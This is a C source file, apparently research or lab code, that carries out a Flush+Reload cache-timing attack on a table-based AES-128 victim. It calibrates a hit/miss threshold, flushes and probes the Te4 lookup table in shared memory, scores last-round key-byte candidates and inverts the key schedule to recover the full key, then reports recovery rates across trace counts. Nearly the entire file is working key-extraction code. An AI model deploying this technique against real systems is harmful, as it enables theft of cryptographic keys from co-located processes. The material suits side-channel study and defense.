// Attacker: last-round union-leak -> FULL AES-128 key.
// Per trace: random plaintext (key fixed per experiment), flush Te4's 16 lines,
// trigger one full encryption, probe the 16 lines once -> union set of last-round
// accesses. Over N known ciphertexts recover every byte of K10:
//   idx = INV_SBOX[ ct[pos] ^ K10[pos] ],  line = idx>>4  (depends on all 8 bits).
// The correct full byte's predicted line is ALWAYS present; wrong bytes drop out as
// traces accumulate. Then invert the key schedule K10 -> K0 and verify.
//
//   gcc -O2 -march=native ost_lr_attacker.c -o ost_lr_attacker -lrt
//   ost_lr_attacker <experiments_per_N>    (OST_ORACLE=1 -> exact-leak logic check)
//   OST_THRESHOLD=<cyc> / OST_THRFRAC=<0..1> tune/pins the F+R cutoff (reproducible)
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include "ost_lr_common.h"
#include "aes_leak.h"

#define MAXT 1024
static int ORACLE = 0;
static uint8_t INV_SBOX[256];
static void build_inv(void){ for(int i=0;i<256;i++) INV_SBOX[AES_SBOX[i]]=(uint8_t)i; }

// Invert the AES-128 key schedule: given K10 (round-10 key, state order) -> K0.
static void invert_key(const uint8_t rk10[16], uint8_t key_out[16]){
    uint8_t w[44][4];
    for(int c=0;c<4;c++) for(int j=0;j<4;j++) w[40+c][j]=rk10[4*c+j];
    for(int i=43;i>=4;i--){
        uint8_t t[4]; for(int j=0;j<4;j++) t[j]=w[i-1][j];
        if(i%4==0){
            uint8_t r=t[0]; t[0]=t[1]; t[1]=t[2]; t[2]=t[3]; t[3]=r;   // RotWord
            for(int j=0;j<4;j++) t[j]=AES_SBOX[t[j]];                   // SubWord
            t[0]^=AES_RCON[i/4-1];
        }
        for(int j=0;j<4;j++) w[i-4][j]=w[i][j]^t[j];
    }
    for(int c=0;c<4;c++) for(int j=0;j<4;j++) key_out[4*c+j]=w[c][j];
}

static int cmp_u64(const void*a,const void*b){uint64_t x=*(const uint64_t*)a,y=*(const uint64_t*)b;return (x>y)-(x<y);}
static uint64_t calibrate(OstLrShared* s){
    const char* te=getenv("OST_THRESHOLD");
    if(te && *te){                                   // empty string => treat as unset
        uint64_t t=strtoull(te,0,10);
        fprintf(stderr,"calib: pinned OST_THRESHOLD=%llu\n",(unsigned long long)t); return t;
    }
    const char* fe=getenv("OST_THRFRAC");
    double frac = (fe && *fe)?atof(fe):0.35;
    const int IT=1500; uint64_t *h=malloc(8*IT),*m=malloc(8*IT);
    volatile uint8_t* probe=(volatile uint8_t*)&s->Te4[0];
    volatile uint8_t* evict=malloc(8*1024*1024);
    for(int i=0;i<IT;i++){volatile uint8_t v=*probe;(void)v;_mm_mfence();h[i]=ost_measure(probe);}
    for(int i=0;i<IT;i++){_mm_clflush((const void*)probe);
        for(size_t j=0;j<8*1024*1024;j+=64){volatile uint8_t v=evict[j];(void)v;}
        _mm_mfence();m[i]=ost_measure(probe);}
    qsort(h,IT,8,cmp_u64);qsort(m,IT,8,cmp_u64);
    uint64_t hm=h[IT/2], mm=m[IT/2];
    uint64_t t=(mm>hm)?(uint64_t)(hm+(mm-hm)*frac):hm+20;
    fprintf(stderr,"calib: hit_med=%llu miss_med=%llu frac=%.2f -> thr=%llu\n",
            (unsigned long long)hm,(unsigned long long)mm,frac,(unsigned long long)t);
    free(h);free(m);free((void*)evict);return t;
}

static uint8_t  CT[MAXT][16];
static uint16_t SET[MAXT];                 // one shared Te4 table -> one 16-bit union set

// exact last-round line set for ORACLE mode (computed from key+pt like the victim)
static uint16_t oracle_lines(const uint8_t key[16], const uint8_t pt[16], uint8_t ct_out[16]){
    uint8_t rk[11][16]; aes128_key_expansion(key, rk);
    uint8_t states[11][16], ref[16];
    aes128_encrypt_trace(pt, rk, states, ref);
    memcpy(ct_out, ref, 16);
    uint8_t st[16]; memcpy(st, states[9], 16); aes_shift_rows(st);
    uint16_t set=0;
    for(int pos=0;pos<16;pos++) set |= (uint16_t)(1u << (st[pos]>>4));
    return set;
}

static void run_experiment(OstLrShared* s, uint64_t thr, int N, int* byte_ok, int* full_ok){
    uint8_t key[16]; for(int i=0;i<16;i++) key[i]=rand()&0xFF;
    memcpy((void*)s->key, key, 16);

    for(int t=0;t<N;t++){
        uint8_t pt[16]; for(int i=0;i<16;i++) pt[i]=rand()&0xFF;
        if(ORACLE){
            SET[t] = oracle_lines(key, pt, CT[t]);
        } else {
            memcpy((void*)s->pt, pt, 16);
            for(int l=0;l<16;l++) _mm_clflush((const void*)((uint8_t*)s->Te4+l*64));
            _mm_mfence();
            s->done_ack=0; s->trig=1;
            while(s->trig && !s->exit_flag) _mm_pause();
            memcpy(CT[t], (const void*)s->ct, 16);
            uint16_t set=0;
            int ord[16]; for(int l=0;l<16;l++) ord[l]=l;
            for(int l=15;l>0;l--){int j=rand()%(l+1);int tmp=ord[l];ord[l]=ord[j];ord[j]=tmp;}
            for(int oi=0;oi<16;oi++){ int l=ord[oi];
                uint64_t tm=ost_measure((volatile uint8_t*)((uint8_t*)s->Te4+l*64));
                if(tm<thr) set|=(uint16_t)(1u<<l);
                _mm_mfence();                 // serialize: blunt the stride prefetcher
            }
            SET[t]=set;
        }
    }

    if(getenv("OST_DEBUG")){
        double sum=0; int mn=99,mx=0;
        for(int t=0;t<N;t++){int pc=__builtin_popcount(SET[t]);sum+=pc;if(pc<mn)mn=pc;if(pc>mx)mx=pc;}
        // also: how often is the TRUE line present? (should be ~100%)
        uint8_t rkk[11][16]; aes128_key_expansion(key,rkk);
        int truehit=0;
        for(int t=0;t<N;t++){ int pos=0; int line=INV_SBOX[CT[t][pos]^rkk[10][pos]]>>4; if(SET[t]&(1u<<line))truehit++; }
        fprintf(stderr,"  [dbg N=%d] mean_popcount=%.1f/16 (min%d max%d)  true-line-present=%.0f%%\n",
                N,sum/N,mn,mx,100.0*truehit/N);
    }
    uint8_t k10[16]; int full=1;
    for(int pos=0;pos<16;pos++){
        int best_k=0, best_sc=-1;
        for(int k=0;k<256;k++){
            int sc=0;
            for(int t=0;t<N;t++){ int line=INV_SBOX[CT[t][pos]^k]>>4; if(SET[t]&(1u<<line)) sc++; }
            if(sc>best_sc){best_sc=sc;best_k=k;}
        }
        k10[pos]=(uint8_t)best_k;
    }
    // ground-truth K10 for scoring
    uint8_t rk[11][16]; aes128_key_expansion(key, rk);
    for(int pos=0;pos<16;pos++){ if(k10[pos]==rk[10][pos]) (*byte_ok)++; else full=0; }
    // full-key check: invert recovered K10 -> K0, compare to the real key
    uint8_t k0[16]; invert_key(k10, k0);
    if(memcmp(k0,key,16)!=0) full=0;
    *full_ok += full;
}

int main(int argc,char**argv){
    int M=(argc>1)?atoi(argv[1]):100;
    ORACLE=getenv("OST_ORACLE")?atoi(getenv("OST_ORACLE")):0;
    setvbuf(stdout,NULL,_IONBF,0);
    build_inv();

    int fd=-1; for(int r=0;r<2000;r++){fd=shm_open(SHM_OST_LR_NAME,O_RDWR,0666);if(fd!=-1)break;usleep(1000);}
    if(fd==-1){perror("shm_open");return 2;}
    OstLrShared* s=mmap(NULL,sizeof(OstLrShared),PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
    if(s==MAP_FAILED){perror("mmap");return 2;}
    while(!s->ready)_mm_pause();
    if(!s->selftest_ok){fprintf(stderr,"WARNING: victim last-round self-test FAILED\n");}
    uint64_t thr=ORACLE?0:calibrate(s);
    srand(time(NULL));

    const int Ns[]={8,16,30,50,100,200,400,700,1000};
    fprintf(stderr,"last-round union-leak -> FULL key: %d experiments/N, mode=%s\n",
            M, ORACLE?"ORACLE(exact)":"F+R");
    printf("%6s | %12s | %18s\n","traces","per-byte(K10)","full 128-bit key");
    printf("-----------------------------------------------------\n");
    for(unsigned r=0;r<sizeof(Ns)/sizeof(Ns[0]);r++){
        int N=Ns[r]; if(N>MAXT)N=MAXT; int byte_ok=0, full=0;
        time_t t0=time(NULL);
        for(int e=0;e<M;e++) run_experiment(s, thr, N, &byte_ok, &full);
        printf("%6d | %11.1f%% | %17.1f%%   (%lds)\n", N, 100.0*byte_ok/(16*M), 100.0*full/M,(long)(time(NULL)-t0));
    }
    s->exit_flag=1;
    munmap(s,sizeof(OstLrShared)); close(fd);
    return 0;
}
